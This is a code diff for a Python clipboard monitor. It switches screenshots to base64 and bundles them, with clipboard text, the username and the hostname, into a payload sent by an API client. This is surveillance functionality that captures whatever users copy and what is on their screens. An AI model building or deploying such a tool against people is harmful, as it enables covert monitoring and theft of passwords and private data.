@@ -14,6 +14,7 @@ import io
 import apiSender
 import time
 import json
+import base64
 
 previous_content = None
 
@@ -39,7 +40,7 @@ def process_clipboard():
     if current_content and current_content != previous_content:
         print("Detected new clipboard content, logging.")
         print(current_content)
-        imageByteArray = do_screenshot()
+        imageBase64String = do_screenshot()
         username = read_username()
         hostname = read_hostname()
 
@@ -48,10 +49,11 @@ def process_clipboard():
         "hostname": hostname,
         "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
         "content": current_content,
+        "img": imageBase64String
         }
-
+        print(imageBase64String)
         utility.log_clipboard_content(current_content, username + " " + hostname, main.log_file)
-        apiSender.send(imageByteArray, data)
+        apiSender.send(imageBase64String, data)
         previous_content = current_content
 
 def get_clipboard_content():
@@ -79,10 +81,10 @@ def do_screenshot():
 
 def byteArray(screenshot):
     img_byte_arr = io.BytesIO()
-    screenshot.save(img_byte_arr, format='PNG')
-    byte_data = img_byte_arr.getvalue()
-    img_byte_arr.seek(0)  
-    return byte_data
+    screenshot.save(img_byte_arr, format='PNG')  # Saving it as PNG in memory
+    img_byte_arr = img_byte_arr.getvalue()  # Getting the byte value of the image
+    base64_string = base64.b64encode(img_byte_arr).decode('utf-8')
+    return base64_string
 
 def read_username():
     username = getpass.getuser()
